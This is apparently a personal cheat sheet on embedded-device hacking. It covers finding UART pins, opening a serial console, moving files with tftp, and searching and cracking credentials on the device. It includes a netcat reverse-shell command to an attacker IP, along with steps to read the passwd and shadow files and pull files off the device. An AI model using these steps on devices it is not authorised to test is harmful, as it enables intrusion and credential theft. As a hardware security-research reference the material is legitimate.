
Guides:
https://www.rapid7.com/blog/post/2019/02/20/iot-security-introduction-to-embedded-hardware-hacking/

### Hardware

##### Find a way to connect a ttl to usb adapter

first try to find a way to connect to the device
are there uart pins (often 4 pins or holes in a row) or another communication standard like jtag?

If there are holes with no pins, solder pins there

If a nice marked uart header, just connect with a ttl to usb device and get started

If nothing is marked, grab a multimeter and beep/meassure:
- beep ground to other ground points, like the outside of connectors
- try and find a pin/pad that fluctuates between 0 and vcc, especially at boot, this could be serial tx
- if four connectors are lined up the other two are probably rx and vcc, try to differentiate them. rx should be capable of much lower current

##### Find the rom/firmware chip

Read on chips to identify their function, measure to confirm voltages like ground, vcc. For voltage converters we will have vin and vout.


Can we find the rom/firmware chip?

### Connecting via UART

In linux:
`lsusb`
`dmesg | grep tty`
	`[17391.962803] usb 2-2.2: cp210x converter now attached to ttyUSB0`

What tty is the device connected to, something similar to `ttyUSB0`

I don't recommend screen but it works, make sure to log the session with script:
`script -f 1.log`
`screen /dev/ttyUSB0 115200`

Recommended (scrollable screen + updating logfile with tee):
`minicom -D /dev/ttyUSB0 -b 115200 | tee 2.log`

### When we get TX information from the device

Get all the info you can about the device, memory addresses, mount info and so on

try to abort boot / can we type commands

## When we have some kind of shell

check available commands
- is busybox available?
	- limitid?
		- https://busybox.net/downloads/binaries/
		- upgrade busybox using tftp (if available) and on kali atftpd (/etc/ /srv/tftp is dir?)
		- atpftd --startdaemon

which fs are read-only and which ar writeable
- mount

check passwd, shadow

make python script to automate

### We end up in uboot or other pre linux env

run `help`

### We end up in some kind of Linux shell

what user are we, what permissions do we have?
- `whoami`, `id`, `ls -la`...

check what commands we have
- `ls /bin`
- `ls /sbin`
- `busybox` (common bundle of commands for iot devices)
- `init` (common executable to initialize Linux on iot devices)

find writeable directories
- `mount` (should show rw status and type, like `ramfs`)
- normal linux commands like `ls -la`, `chmod` and `chown`

if we have `tftp`  (trivial file transfer protocol) available we can use it to send and receive files
- share files using `atftpd` (included in kali)
	- file share should be `/srv/tftpd` and the owner should be `nobody`, if not: check the config file `cat /etc/defualt/atftpd`
	- start daemon with `sudo atftpd --daemon`
- get files from iot device
	- `-g` to get, `-p` to put, `-l local_file`, `-r remote_file`
	- `tftp -g -r filename 10.10.10.10`
	- `tftp -p -l filename 10.10.10.10`

if we have a limited busybox we try to get the full version to the box
- find out the architexture and version of busybox
	- run busybox
	- run `file` on an executable from the box
- get the right version from https://busybox.net/downloads/binaries/
- `tftp -g -r busybox 10.10.10.10` (be in a dir where you can write)
- set permissions `chmod 777`
- remember to run busybox with the right path like `./busybox nc 10.10.10.10.443 -e /bin/bash`

if we have a init command we might want to upload it to out computer to reverse engineer it
- `tftp -p -l init 10.10.10.10` (be in the right dir)

explore linux
- normal linux exploration, remember that commands might be limited, like ps not having aux
- remember a read only fs is probably easier to explore via firmware dl, a ramfs... on the other hand it's easier to check out on the device
- search for things:
	- `./busybox grep -r 'pass' .`
	- `./busybox grep -r 'admin' .`
	- `./busybox grep -r 'api' .`
	- `./busybox grep -r '.com' .`
	- `./busybox grep -r 'admin' .`
	- `./busybox find -name '*.xml'`
	- `./busybox find -name '*.conf'`
	- `./busybox find -name '*.txt'`

crack found passwords, remember that the passwords you have selected while configuring will be in there too, so it might be good to use easily cracked ones for testing this

